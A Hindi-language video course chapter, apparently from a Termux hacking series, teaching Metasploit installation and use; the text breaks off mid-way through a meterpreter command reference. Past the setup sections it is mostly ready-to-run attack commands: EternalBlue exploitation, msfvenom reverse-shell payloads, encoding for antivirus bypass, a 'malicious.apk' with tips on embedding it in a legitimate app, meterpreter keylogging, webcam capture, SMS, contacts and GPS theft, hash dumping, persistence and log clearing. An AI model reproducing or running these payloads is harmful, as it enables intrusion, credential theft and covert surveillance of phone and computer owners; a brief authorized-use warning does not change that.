# Chapter 35: Metasploit Framework Basics

> **Module:** 6 - Security Tools  
> **Chapter:** 35 of 61  
> **Duration:** 25-30 Minutes  
> **Difficulty:** ⭐⭐⭐ Intermediate  

---

## 📋 Chapter Overview

| Section | Content |
|---------|---------|
| Video Script | Complete Hindi narration with timestamps |
| Technical Guide | Detailed Metasploit architecture & usage |
| Installation Guide | Proot-based installation method |
| Commands Reference | 30+ Metasploit commands covered |
| Practice Exercises | Hands-on exploitation labs |
| Troubleshooting | Common Metasploit issues |
| Video Assets | Thumbnail, description, tags |

---

## 🎬 VIDEO SCRIPT (Complete Hindi Narration)

```
═══════════════════════════════════════════════════════════════════════════════
TERMUX FULL COURSE - CHAPTER 35
Title: Metasploit Framework Basics | Complete Guide | T3rmuxk1ng
Duration: 25-30 Minutes
═══════════════════════════════════════════════════════════════════════════════

[INTRO - 0:00 to 1:00]
─────────────────────────────────────────────────────────────────────────────

Namaskar Dosto! Welcome back to Termux Full Course!

Main aapka host hoon T3rmuxk1ng, aur aaj ek bahut important chapter hai -
Chapter 35: Metasploit Framework Basics!

Metasploit - ye naam suna hai? Agar hacking seekh rahe ho, to ye naam 
kabhi na kabhi sunoge zaroor. Metasploit world's most popular penetration 
testing framework hai. Ye ethical hackers, security researchers, aur 
penetration testers sab use karte hain.

Aaj hum Termux mein Metasploit install karenge, samjhenge iska architecture,
seekhenge msfconsole, msfvenom, aur real exploitation karenge!

Ye chapter thoda advanced hai, isliye dhyan se suniye. Chaliye shuru karte hain!

Play button dabaiye, like karein, subscribe karein - notification bell ke saath.

---

[SECTION 1: METASPLOIT INTRODUCTION - 1:00 to 4:00]
─────────────────────────────────────────────────────────────────────────────

To sabse pehle - Metasploit kya hai?

Metasploit ek penetration testing framework hai. Iska matlab ye hai ki 
ye ek collection hai tools ka, exploits ka, payloads ka - jo security 
testing ke liye use hote hain.

History thoda samjhein:
- 2003 mein H.D. Moore ne banaya tha
- 2009 mein Rapid7 company ne acquire kiya
- Ab ye world's #1 penetration testing framework hai

Metasploit kya kya kar sakta hai?

✓ Vulnerability exploitation - System ki weaknesses exploit karna
✓ Payload delivery - Malicious code deliver karna
✓ Post-exploitation - Access ke baad information gathering
✓ Network scanning - Networks aur services discover karna
✓ Bruteforce attacks - Password cracking
✓ Social engineering - Phishing attacks

Real world mein Metasploit ka use:
- Penetration testers - Company ki security test karne ke liye
- Security researchers - Vulnerabilities research karne ke liye
- Bug bounty hunters - Bugs dhundhne ke liye
- Red team operators - Advanced security testing ke liye

⚠️ IMPORTANT WARNING:
Metasploit sirf authorized testing ke liye use karna. Bina permission 
ke kisi system ko hack karna illegal hai. Ye tool educational purpose 
ke liye hai - apne systems test karne ke liye, ya jahan permission ho.

---

[SECTION 2: TERMUX + METASPloit CHALLENGES - 4:00 to 6:00]
─────────────────────────────────────────────────────────────────────────────

Ab Termux mein Metasploit ki baat karte hain.

Normal Termux mein Metasploit directly install nahi ho sakta. Kyun?

Problem ye hai:
1. Metasploit Ruby 2.5+ chahiye, Termux ke packages compatible nahi
2. Database support issues (PostgreSQL)
3. Memory constraints - Metasploit heavy hai
4. Some native extensions compile nahi hote

Solution kya hai?

PROOT! 🎯

Proot ek tool hai jo Android pe Linux environment run karne mein madad 
karta hai. Iski madad se hum Termux mein Ubuntu ya Kali Linux run kar 
sakte hain, aur usme Metasploit install kar sakte hain.

Two methods hain:

METHOD 1: Termux-Metasploit Package (Limited)
- Community maintained package
- Thoda outdated ho sakta hai
- Some features missing
- But easy to install

METHOD 2: Proot-Distro + Ubuntu/Kali (Recommended)
- Full Linux environment
- Latest Metasploit version
- All features working
- Database support

Aaj hum METHOD 2 use karenge - Proot ke saath proper installation.

---

[SECTION 3: PROOT INSTALLATION - 6:00 to 10:00]
─────────────────────────────────────────────────────────────────────────────

Chaliye ab installation start karte hain. Step by step follow karein.

[STEP 1: Update Termux]

Pehle Termux ko update karein:
    pkg update && pkg upgrade -y

Ye basic step hai - har installation se pehle karna chahiye.

[STEP 2: Install Required Packages]

Ab proot-distro aur other tools install karein:
    pkg install proot-distro git wget curl -y

Proot-distro wo package hai jo Linux distributions manage karta hai.

[STEP 3: Install Ubuntu]

Ubuntu install karein:
    proot-distro install ubuntu

Ye download karega Ubuntu rootfs aur setup karega. Thoda time lagega 
depending on internet speed.

[STEP 4: Login to Ubuntu]

Ubuntu mein login karein:
    proot-distro login ubuntu

Aapka prompt change ho jaayega - ubuntu user mein aa jaoge.

[STEP 5: Update Ubuntu]

Ubuntu ko update karein:
    apt update && apt upgrade -y

[STEP 6: Install Dependencies]

Metasploit ke liye dependencies install karein:
    apt install build-essential libreadline-dev libssl-dev libpq-dev \
    libsqlite3-dev ruby-dev ruby-bundler postgresql -y

Ye thoda time lagega - packages download aur install honge.

---

[SECTION 4: METASPLOIT INSTALLATION - 10:00 to 14:00]
─────────────────────────────────────────────────────────────────────────────

Ab Metasploit install karte hain.

[OPTION A: Via MSF Installer (Easiest)]

    curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall
    chmod 755 msfinstall
    ./msfinstall

[OPTION B: Manual Installation]

    # Install Ruby
    apt install ruby-full -y
    
    # Clone Metasploit
    git clone https://github.com/rapid7/metasploit-framework.git
    
    # Navigate to directory
    cd metasploit-framework
    
    # Install gems
    bundle install

First time installation 15-20 minutes lag sakta hai. Patience rakhein.

Installation verify karein:
    msfconsole --version

Agar version output aaya - installation successful! 🎉

---

[SECTION 5: METASPLOIT ARCHITECTURE - 14:00 to 17:00]
─────────────────────────────────────────────────────────────────────────────

Ab samjhein Metasploit ka architecture. Ye important hai.

┌─────────────────────────────────────────────────────────────────────────┐
│                    METASPLOIT FRAMEWORK ARCHITECTURE                     │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                          │
│   ┌─────────────────────────────────────────────────────────────────┐   │
│   │                         msfconsole                               │   │
│   │              (Primary Command-Line Interface)                    │   │
│   └─────────────────────────────────────────────────────────────────┘   │
│                                   │                                      │
│          ┌────────────────────────┼────────────────────────┐            │
│          ▼                        ▼                        ▼            │
│   ┌────────────┐          ┌────────────┐          ┌────────────┐        │
│   │  EXPLOITS  │          │  PAYLOADS  │          │  AUXILIARY │        │
│   │            │          │            │          │            │        │
│   │ Attack code│          │ Shellcode  │          │ Scanners   │        │
│   │ for vulns  │          │ to execute │          │ Fuzzers    │        │
│   └────────────┘          └────────────┘          └────────────┘        │
│                                                                          │
│   ┌────────────┐          ┌────────────┐          ┌────────────┐        │
│   │   POST     │          │  ENCODERS  │          │   NOPS     │        │
│   │            │          │            │          │            │        │
│   │ Post-      │          │ Obfuscate  │          │ No         │
│   │ exploit    │          │ payloads   │          │ Operation  │        │
│   └────────────┘          └────────────┘          └────────────┘        │
│                                                                          │
│   ┌─────────────────────────────────────────────────────────────────┐   │
│   │                        msfvenom                                  │   │
│   │            (Payload Generation & Encoding Tool)                  │   │
│   └─────────────────────────────────────────────────────────────────┘   │
│                                                                          │
│   ┌─────────────────────────────────────────────────────────────────┐   │
│   │                       DATABASE (PostgreSQL)                      │   │
│   │            (Workspace, Hosts, Services, Credentials)             │   │
│   └─────────────────────────────────────────────────────────────────┘   │
│                                                                          │
└─────────────────────────────────────────────────────────────────────────┘

MODULES EXPLAINED:

1. EXPLOITS - Ye wo code hai jo vulnerability exploit karta hai
   Example: exploit/windows/smb/ms17_010_eternalblue
   
2. PAYLOADS - Ye wo code hai jo target system pe execute hota hai
   Example: windows/meterpreter/reverse_tcp
   
3. AUXILIARY - Scanners, fuzzers, and other non-exploit tools
   Example: auxiliary/scanner/portscan/tcp
   
4. POST - Post-exploitation modules
   Example: post/windows/gather/hashdump
   
5. ENCODERS - Payloads ko encode karte hain AV bypass ke liye
   Example: x86/shikata_ga_nai
   
6. NOPS - No-operation sleds for buffer overflow exploits

---

[SECTION 6: MSFCONSOLE BASICS - 17:00 to 21:00]
─────────────────────────────────────────────────────────────────────────────

Ab msfconsole use karna seekhte hain. Ye Metasploit ka main interface hai.

Msfconsole start karein:
    msfconsole

First time mein thoda time lagega load hone mein.

[SCREEN: Msfconsole Welcome Banner]

Aapko ek cool ASCII art banner dikhega, aur phir prompt:
    msf6 >

Ye "msf6" prompt hai. Yahan se aap commands run kar sakte ho.

BASIC COMMANDS:

1. HELP - Saare commands dekho
    msf6 > help

2. VERSION - Metasploit version
    msf6 > version

3. BANNER - ASCII banner dekho
    msf6 > banner

4. SHOW - Modules display karein
    msf6 > show exploits
    msf6 > show payloads
    msf6 > show auxiliary
    msf6 > show encoders
    msf6 > show post

5. SEARCH - Modules search karein
    msf6 > search apache
    msf6 > search type:exploit platform:windows smb
    msf6 > search cve:2017

6. INFO - Module ki details
    msf6 > info exploit/windows/smb/ms17_010_eternalblue

7. USE - Module select karein
    msf6 > use exploit/windows/smb/ms17_010_eternalblue

8. BACK - Module se bahar aao
    msf6 exploit(windows/smb/ms17_010_eternalblue) > back

9. EXIT - Msfconsole se bahar aao
    msf6 > exit

---

[SECTION 7: SEARCH COMMAND DEEP DIVE - 21:00 to 23:30]
─────────────────────────────────────────────────────────────────────────────

Search command bahut powerful hai. Iske filters samjhein:

SEARCH BY NAME:
    msf6 > search eternalblue

SEARCH BY TYPE:
    msf6 > search type:exploit eternalblue
    msf6 > search type:auxiliary scanner
    msf6 > search type:payload meterpreter

SEARCH BY PLATFORM:
    msf6 > search platform:windows smb
    msf6 > search platform:android
    msf6 > search platform:linux apache

SEARCH BY CVE:
    msf6 > search cve:2017
    msf6 > search cve:2021-44228

SEARCH BY APP:
    msf6 > search app:apache
    msf6 > search app:mysql

COMBINED SEARCH:
    msf6 > search type:exploit platform:windows cve:2017

SEARCH RESULTS:
    #   Name                           Date       Rank    Check  Description
    0   exploit/windows/smb/...        2017-03-14 average  Yes    MS17-010...

Result ka number use karo:
    msf6 > use 0

---

[SECTION 8: EXPLOITATION WORKFLOW - 23:30 to 26:30]
─────────────────────────────────────────────────────────────────────────────

Ab real exploitation workflow samjhein.

STEP-BY-STEP PROCESS:

STEP 1: Search for exploit
    msf6 > search type:exploit platform:windows smb

STEP 2: Select exploit
    msf6 > use exploit/windows/smb/ms17_010_eternalblue

STEP 3: Check options
    msf6 exploit(...) > show options

    Name     Current Setting  Required  Description
    ----     ---------------  --------  -----------
    RHOSTS                    yes       The target address
    RPORT    445              yes       The target port

STEP 4: Set required options
    msf6 exploit(...) > set RHOSTS 192.168.1.100
    msf6 exploit(...) > set RPORT 445

STEP 5: Set payload
    msf6 exploit(...) > set payload windows/meterpreter/reverse_tcp

STEP 6: Set payload options
    msf6 exploit(...) > set LHOST 192.168.1.50  # Your IP
    msf6 exploit(...) > set LPORT 4444

STEP 7: Verify configuration
    msf6 exploit(...) > show options

STEP 8: Check if exploit works
    msf6 exploit(...) > check

STEP 9: Run exploit
    msf6 exploit(...) > exploit
    or
    msf6 exploit(...) > run

SUCCESS? Meterpreter session mil jaayega!

---

[SECTION 9: PAYLOADS & MSFVENOM - 26:30 to 30:00]
─────────────────────────────────────────────────────────────────────────────

Ab msfvenom seekhte hain. Ye standalone payloads generate karta hai.

MSFVENOM SYNTAX:
    msfvenom -p <payload> LHOST=<ip> LPORT=<port> -f <format> -o <output>

COMMON PAYLOADS:

Windows Reverse Shell:
    msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f exe -o shell.exe

Windows Bind Shell:
    msfvenom -p windows/meterpreter/bind_tcp RHOST=192.168.1.100 LPORT=4444 -f exe -o bind.exe

Android Payload:
    msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -o app.apk

Linux Payload:
    msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f elf -o shell.elf

PHP Payload:
    msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f raw -o shell.php

ENCODING PAYLOADS:
    msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe -o encoded.exe

-e = encoder
-i = iterations (kitne baar encode karna hai)

LIST PAYLOADS:
    msfvenom --list payloads

LIST ENCODERS:
    msfvenom --list encoders

LIST FORMATS:
    msfvenom --list formats

---

[SECTION 10: HANDLER SETUP - 30:00 to 33:00]
─────────────────────────────────────────────────────────────────────────────

Jab aapne standalone payload banaya (msfvenom se), to usko catch karne 
ke liye handler chahiye.

Handler setup kaise karein:

STEP 1: Start msfconsole
    msfconsole

STEP 2: Use exploit/multi/handler
    msf6 > use exploit/multi/handler

STEP 3: Set payload (same as msfvenom payload)
    msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp

STEP 4: Set LHOST (your IP)
    msf6 exploit(multi/handler) > set LHOST 192.168.1.50

STEP 5: Set LPORT (same as in payload)
    msf6 exploit(multi/handler) > set LPORT 4444

STEP 6: Run handler
    msf6 exploit(multi/handler) > exploit

[*] Started reverse TCP handler on 192.168.1.50:4444

Ab ye wait karega connection ke liye. Jab target machine pe payload 
run hoga, aapko session mil jaayega!

AUTOMATED HANDLER:
    msfconsole -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST 192.168.1.50; set LPORT 4444; exploit;"

---

[SECTION 11: METERPRETER BASICS - 33:00 to 37:00]
─────────────────────────────────────────────────────────────────────────────

Meterpreter ek advanced payload hai jo bahut saare features deta hai.

Jab session mil jaaye, Meterpreter prompt aayega:
    meterpreter >

BASIC METERPRETER COMMANDS:

System Information:
    meterpreter > sysinfo
    meterpreter > getuid          # Current user
    meterpreter > getpid          # Process ID
    meterpreter > ps              # Running processes

File System:
    meterpreter > pwd             # Current directory
    meterpreter > ls              # List files
    meterpreter > cd C:\\Users    # Change directory
    meterpreter > cat file.txt    # Read file
    meterpreter > download file   # Download file
    meterpreter > upload file     # Upload file
    meterpreter > mkdir folder    # Create directory
    meterpreter > rm file         # Delete file

Network:
    meterpreter > ipconfig        # Network interfaces
    meterpreter > netstat         # Network connections
    meterpreter > route           # Routing table

Process Management:
    meterpreter > migrate PID     # Migrate to another process
    meterpreter > execute -f cmd.exe -i -H  # Execute command
    meterpreter > kill PID        # Kill process

Privilege Escalation:
    meterpreter > getsystem       # Try to get SYSTEM
    meterpreter > getprivs        # Get privileges

Hash Dump:
    meterpreter > hashdump        # Dump password hashes

Screenshots & Keylogging:
    meterpreter > screenshot      # Take screenshot
    meterpreter > keyscan_start   # Start keylogger
    meterpreter > keyscan_dump    # Dump keystrokes
    meterpreter > keyscan_stop    # Stop keylogger

Webcam:
    meterpreter > webcam_list     # List webcams
    meterpreter > webcam_snap     # Take photo

Persistence:
    meterpreter > run persistence -U -i 10 -p 4444 -r 192.168.1.50

Shell Access:
    meterpreter > shell           # Get command shell
    meterpreter > execute -f cmd.exe -i -H

Session Management:
    meterpreter > background      # Background session
    msf6 > sessions -l            # List sessions
    msf6 > sessions -i 1          # Interact with session 1
    msf6 > sessions -k 1          # Kill session 1

---

[SECTION 12: POST-EXPLOITATION MODULES - 37:00 to 40:00]
─────────────────────────────────────────────────────────────────────────────

Meterpreter mein hum post modules run kar sakte hain.

USEFUL POST MODULES:

Information Gathering:
    run post/windows/gather/enum_system
    run post/windows/gather/enum_applications
    run post/windows/gather/enum_network
    run post/windows/gather/enum_shares

Credential Harvesting:
    run post/windows/gather/smart_hashdump
    run post/windows/gather/credentials/gpp
    run post/windows/gather/enum_chrome

Privilege Escalation:
    run post/multi/recon/local_exploit_suggester

Persistence:
    run post/windows/manage/persistence

Pivoting:
    run post/multi/manage/autoroute

HOW TO USE POST MODULES:

Inside meterpreter:
    meterpreter > run post/windows/gather/enum_system

From msfconsole:
    msf6 > use post/windows/gather/hashdump
    msf6 post(...) > set SESSION 1
    msf6 post(...) > run

---

[SECTION 13: COMMON EXPLOITS DEMO - 40:00 to 44:00]
─────────────────────────────────────────────────────────────────────────────

Kuch common exploits dekhein:

1. VSFTPD Backdoor (vsftpd-2.3.4):
    use exploit/unix/ftp/vsftpd_234_backdoor
    set RHOSTS target_ip
    run

2. Apache Tomcat Manager:
    use exploit/multi/http/tomcat_mgr_upload
    set RHOSTS target_ip
    set HttpUsername admin
    set HttpPassword admin
    run

3. Samba Symlink:
    use exploit/multi/samba/symlink_traversal
    set RHOSTS target_ip
    run

4. Shellshock:
    use exploit/multi/http/apache_mod_cgi_bash_env_exec
    set RHOSTS target_ip
    set TARGETURI /cgi-bin/vulnerable.cgi
    run

---

[SECTION 14: ANDROID PAYLOADS - 44:00 to 47:00]
─────────────────────────────────────────────────────────────────────────────

Android ke liye payload banana:

BASIC ANDROID PAYLOAD:
    msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -o malicious.apk

EMBEDDING IN LEGITIMATE APP:
    # Using apktool and smali (advanced)
    # Or use tools like TheFatRat

HANDLER FOR ANDROID:
    use exploit/multi/handler
    set payload android/meterpreter/reverse_tcp
    set LHOST 192.168.1.50
    set LPORT 4444
    run

ANDROID METERPRETER COMMANDS:
    meterpreter > dump_calllog     # Get call logs
    meterpreter > dump_contacts    # Get contacts
    meterpreter > dump_sms         # Get SMS
    meterpreter > geolocate        # Get GPS location
    meterpreter > webcam_list      # List cameras
    meterpreter > webcam_snap      # Take photo

---

[SECTION 15: ENCODING & EVASION - 47:00 to 49:30]
─────────────────────────────────────────────────────────────────────────────

Antivirus bypass ke liye encoding:

COMMON ENCODERS:
    x86/shikata_ga_nai           # Most popular
    x86/call4_dword_xor
    x86/countdown
    x86/fnstenv_mov

MULTI-ENCODING:
    msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -e x86/shikata_ga_nai -i 10 -f exe -o encoded.exe

ENCODER LIST:
    msfvenom --list encoders

EVASION TECHNIQUES:
1. Multiple encoding iterations
2. Custom payloads
3. Binary modification
4. Crypters
5. Process injection

NOTE: Modern AVs are very good at detecting encoded payloads. 
For real evasion, you need custom development.

---

[SECTION 16: DATABASE USAGE - 49:30 to 52:00]
─────────────────────────────────────────────────────────────────────────────

Metasploit database features:

START DATABASE:
    service postgresql start
    msfdb init

CONNECT TO DATABASE:
    msfconsole
    msf6 > db_connect

CHECK STATUS:
    msf6 > db_status

WORKSPACES:
    msf6 > workspace              # List workspaces
    msf6 > workspace -a project1  # Add workspace
    msf6 > workspace project1     # Switch workspace
    msf6 > workspace -d project1  # Delete workspace

IMPORT SCAN RESULTS:
    msf6 > db_import nmap_scan.xml

EXPORT DATA:
    msf6 > db_export -f xml backup.xml

HOSTS:
    msf6 > hosts                  # List hosts
    msf6 > hosts -S 192.168       # Search hosts

SERVICES:
    msf6 > services               # List services
    msf6 > services -S ssh        # Search services

CREDENTIALS:
    msf6 > creds                  # List credentials
    msf6 > creds add user:admin pass:password

LOOTS:
    msf6 > loot                   # List collected data

---

[SECTION 17: BEST PRACTICES & SUMMARY - 52:00 to 55:00]
─────────────────────────────────────────────────────────────────────────────

METASPLOIT BEST PRACTICES:

✓ Always test on authorized systems only
✓ Document everything you do
✓ Use workspaces for organization
✓ Keep Metasploit updated
✓ Understand what exploit does before running
✓ Check for false positives
✓ Don't rely solely on Metasploit
✓ Combine with manual testing
✓ Use proper encoding for payloads
✓ Clean up after testing

CHAPTER SUMMARY:

Aaj humne seekha:
✅ Metasploit Framework introduction
✅ Proot-based installation in Termux
✅ Metasploit architecture - modules explained
✅ Msfconsole interface - search, use, info commands
✅ Exploitation workflow - complete process
✅ Msfvenom - payload generation
✅ Handler setup for standalone payloads
✅ Meterpreter basics - post-exploitation
✅ Common exploits
✅ Android payload creation
✅ Encoding and evasion techniques
✅ Database usage

IMPORTANT COMMANDS YAAD RAKHEIN:

┌─────────────────────────────────────────────────────────────────────────┐
│                    ESSENTIAL METASPLOIT COMMANDS                         │
├─────────────────────────────────────────────────────────────────────────┤
│ msfconsole              │ Start Metasploit console                       │
│ search <term>           │ Search for modules                             │
│ use <module>            │ Select a module                                │
│ show options            │ Display module options                         │
│ set <option> <value>    │ Set an option                                  │
│ setg <option> <value>   │ Set global option                              │
│ exploit / run           │ Execute exploit                                │
│ msfvenom -p ...         │ Generate payload                               │
│ sessions -l             │ List active sessions                           │
│ sessions -i <id>        │ Interact with session                          │
│ db_status               │ Check database connection                      │
│ workspace               │ Manage workspaces                              │
└─────────────────────────────────────────────────────────────────────────┘

---

[OUTRO - 55:00 to 56:00]
─────────────────────────────────────────────────────────────────────────────

Dosto, Chapter 35 complete!

Metasploit ek bahut powerful framework hai. Jo humne aaj seekha wo basics 
the. Iske baad bahut practice chahiye real mastery ke liye.

Agar ye video helpful lagi:
👍 Like button press karein
🔔 Subscribe karein, notification bell on karein
💬 Koi sawal ho to comment mein poochein
📤 Share karein friends ke saath

Next Chapter 36 mein hum PhoneSploit aur ADB tools seekhenge.

Thank you for watching! See you in Chapter 36!

═══════════════════════════════════════════════════════════════════════════════
```

---

## 📖 TECHNICAL GUIDE

### 1. Metasploit Framework Overview

```
┌─────────────────────────────────────────────────────────────────────────┐
│                    METASPLOIT FRAMEWORK COMPONENTS                       │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                          │
│  ┌────────────────────────────────────────────────────────────────────┐ │
│  │                         INTERFACES                                  │ │
│  ├────────────────┬─────────────────┬─────────────────┬───────────────┤ │
│  │   msfconsole   │    msfvenom     │      msfcli     │   msfgui      │ │
│  │   (Primary)    │  (Payload Gen)  │   (CLI Tool)    │  (GUI - Old)  │ │
│  └────────────────┴─────────────────┴─────────────────┴───────────────┘ │
│                                                                          │
│  ┌────────────────────────────────────────────────────────────────────┐ │
│  │                          MODULES                                    │ │
│  ├────────────────┬─────────────────┬─────────────────┬───────────────┤ │
│  │    Exploits    │    Payloads     │   Auxiliary     │     Post      │ │
│  │  (2000+)       │   (1000+)       │   (1500+)       │    (500+)     │ │
│  └────────────────┴─────────────────┴─────────────────┴───────────────┘ │
│                                                                          │
│  ┌────────────────────────────────────────────────────────────────────┐ │
│  │                         TOOLS                                       │ │
│  ├────────────────┬─────────────────┬─────────────────┬───────────────┤ │
│  │    Encoders    │      NOPS       │   Evasion      │   NOP Generators│ │
│  └────────────────┴─────────────────┴─────────────────┴───────────────┘ │
│                                                                          │
│  ┌────────────────────────────────────────────────────────────────────┐ │
│  │                         DATABASE                                    │ │
│  ├────────────────────────────────────────────────────────────────────┤ │
│  │                      PostgreSQL Backend                             │ │
│  │        (Workspaces, Hosts, Services, Creds, Loot)                  │ │
│  └────────────────────────────────────────────────────────────────────┘ │
│                                                                          │
└─────────────────────────────────────────────────────────────────────────┘
```

### 2. Installation Methods

#### Method A: Proot-Distro (Recommended for Termux)

```bash
# Step 1: Update Termux
pkg update && pkg upgrade -y

# Step 2: Install proot-distro
pkg install proot-distro git wget curl -y

# Step 3: Install Ubuntu
proot-distro install ubuntu

# Step 4: Login to Ubuntu
proot-distro login ubuntu

# Step 5: Update Ubuntu
apt update && apt upgrade -y

# Step 6: Install dependencies
apt install -y build-essential libreadline-dev libssl-dev \
libpq-dev libsqlite3-dev ruby-dev ruby-bundler postgresql \
wget curl git

# Step 7: Install Metasploit via installer
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall
chmod 755 msfinstall
./msfinstall

# Step 8: Verify installation
msfconsole --version
```

#### Method B: Manual Installation

```bash
# After logging into Ubuntu proot
apt install -y ruby-full

# Clone Metasploit
git clone https://github.com/rapid7/metasploit-framework.git
cd metasploit-framework

# Install bundler
gem install bundler

# Install dependencies
bundle install

# Create symlink
ln -s $(pwd)/msfconsole /usr/local/bin/msfconsole
ln -s $(pwd)/msfvenom /usr/local/bin/msfvenom
```

### 3. Module Types Explained

| Module Type | Description | Count | Example |
|-------------|-------------|-------|---------|
| **Exploits** | Code that exploits vulnerabilities | 2000+ | exploit/windows/smb/ms17_010_eternalblue |
| **Payloads** | Code executed on target | 1000+ | windows/meterpreter/reverse_tcp |
| **Auxiliary** | Scanners, fuzzers, etc. | 1500+ | auxiliary/scanner/portscan/tcp |
| **Post** | Post-exploitation modules | 500+ | post/windows/gather/hashdump |
| **Encoders** | Encode/obfuscate payloads | 50+ | x86/shikata_ga_nai |
| **NOPS** | No-operation sleds | 10+ | nop/x86/single_byte |

### 4. Payload Types

```
┌─────────────────────────────────────────────────────────────────────────┐
│                        PAYLOAD CATEGORIES                                │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                          │
│  ┌───────────────────────────────────────────────────────────────────┐  │
│  │                        BIND PAYLOADS                               │  │
│  │  Target listens on a port, attacker connects to it               │  │
│  │  Example: windows/meterpreter/bind_tcp                           │  │
│  │  Use when: Target behind NAT, can't reach attacker               │  │
│  └───────────────────────────────────────────────────────────────────┘  │
│                                                                          │
│  ┌───────────────────────────────────────────────────────────────────┐  │
│  │                       REVERSE PAYLOADS                            │  │
│  │  Target connects back to attacker                                │  │
│  │  Example: windows/meterpreter/reverse_tcp                        │  │
│  │  Use when: Target has outbound access, attacker has public IP    │  │
│  └───────────────────────────────────────────────────────────────────┘  │
│                                                                          │
│  ┌───────────────────────────────────────────────────────────────────┐  │
│  │                      STAGED PAYLOADS                              │  │
│  │  Small initial stager, then downloads full payload               │  │
│  │  Example: windows/meterpreter/reverse_tcp (staged)               │  │
│  │  Pros: Smaller initial size                                      │  │
│  └───────────────────────────────────────────────────────────────────┘  │
│                                                                          │
│  ┌───────────────────────────────────────────────────────────────────┐  │
│  │                     STAGELESS PAYLOADS                            │  │
│  │  Complete payload in one file                                    │  │
│  │  Example: windows/meterpreter_reverse_tcp (stageless)            │  │
│  │  Pros: Works when staging is blocked                             │  │
│  └───────────────────────────────────────────────────────────────────┘  │
│                                                                          │
│  ┌───────────────────────────────────────────────────────────────────┐  │
│  │                      METERPRETER                                  │  │
│  │  Advanced payload with many features                             │  │
│  │  Features: File ops, screenshot, keylog, webcam, pivoting        │  │
│  └───────────────────────────────────────────────────────────────────┘  │
│                                                                          │
└─────────────────────────────────────────────────────────────────────────┘
```

### 5. Exploitation Workflow

```
┌─────────────────────────────────────────────────────────────────────────┐
│                    METASPLOIT EXPLOITATION WORKFLOW                      │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                          │
│  ┌──────────┐    ┌──────────┐    ┌──────────┐    ┌──────────┐          │
│  │ RECON    │ -> │ SEARCH   │ -> │ SELECT   │ -> │ CONFIG   │          │
│  │          │    │          │    │          │    │          │          │
│  │ Target   │    │ Find     │    │ Choose   │    │ Set      │          │
│  │ Info     │    │ Exploit  │    │ Module   │    │ Options  │          │
│  └──────────┘    └──────────┘    └──────────┘    └──────────┘          │
│       │              │               │               │                  │
│       ▼              ▼               ▼               ▼                  │
│  - Port scan    - search cmd    - use cmd      - set RHOSTS            │
│  - Service id   - CVE search    - info cmd     - set PAYLOAD           │
│  - OS detect    - App search    - check vuln   - set LHOST             │
│                                                                  │
│  ┌──────────┐    ┌──────────┐    ┌──────────┐    ┌──────────┐          │
│  │ EXECUTE  │ -> │ SESSION  │ -> │ POST-EXP │ -> │ CLEANUP  │          │
│  │          │    │          │    │          │    │          │          │
│  │ Run      │    │ Get      │    │ Gather   │    │ Remove   │          │
│  │ Exploit  │    │ Access   │    │ Info     │    │ Traces   │          │
│  └──────────┘    └──────────┘    └──────────┘    └──────────┘          │
│       │              │               │               │                  │
│       ▼              ▼               ▼               ▼                  │
│  - exploit cmd  - meterpreter  - hashdump      - clear logs           │
│  - run cmd      - shell        - screenshot    - remove files          │
│  - check cmd    - pivot        - persistence   - close sessions        │
│                                                                          │
└─────────────────────────────────────────────────────────────────────────┘
```

### 6. Msfvenom Reference

```bash
# Msfvenom Syntax
msfvenom -p <payload> [options] -f <format> -o <output_file>

# Common Options
-p, --payload    <payload>     Payload to use
-f, --format     <format>      Output format (exe, elf, apk, php, etc.)
-o, --out        <path>        Output file path
-e, --encoder    <encoder>     Encoder to use
-i, --iterations <count>       Encoding iterations
-x, --template   <path>        Custom executable template
-k, --keep                     Keep template functionality
-a, --arch       <arch>        Architecture (x86, x64)
--platform       <platform>    Platform (windows, linux, android)
-s, --space      <bytes>       Maximum payload size
-b, --bad-chars  <chars>       Characters to avoid
-n, --nopsled    <count>       NOP sled size

# Payload Options (set during generation)
LHOST    Attacker IP (for reverse shells)
LPORT    Attacker port
RHOST    Target IP (for bind shells)
RPORT    Target port
```

### 7. Windows Payload Formats

| Format | Extension | Description |
|--------|-----------|-------------|
| exe | .exe | Windows executable |
| dll | .dll | Dynamic link library |
| msi | .msi | Windows installer |
| vbs | .vbs | VBScript |
| bat | .bat | Batch file |
| ps1 | .ps1 | PowerShell script |
| hta | .hta | HTML Application |
| vba | - | VBA code for Office |

### 8. Linux Payload Formats

| Format | Extension | Description |
|--------|-----------|-------------|
| elf | - | Linux executable |
| elf-so | .so | Shared object |
| elf-bundle | - | Static binary |
| python | .py | Python script |
| perl | .pl | Perl script |
| bash | .sh | Bash script |
| java | .jar | Java JAR file |

### 9. Handler Configuration

```bash
# Basic Handler Setup
msfconsole
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 0.0.0.0
msf6 exploit(multi/handler) > set LPORT 4444
msf6 exploit(multi/handler) > exploit -j  # Run in background

# Auto-run scripts
msf6 exploit(multi/handler) > set AutoRunScript post/windows/manage/migrate

# Multi Handler (multiple connections)
msf6 exploit(multi/handler) > set ExitOnSession false
msf6 exploit(multi/handler) > exploit -j
```

### 10. Meterpreter Commands Reference

#### System Commands

```bash
sysinfo              # System information
getuid               # Current user
getpid               # Current process ID
ps                   # List processes
migrate <pid>        # Migrate to another process
execute -f <file>    # Execute a file
kill <pid>           # Kill a process
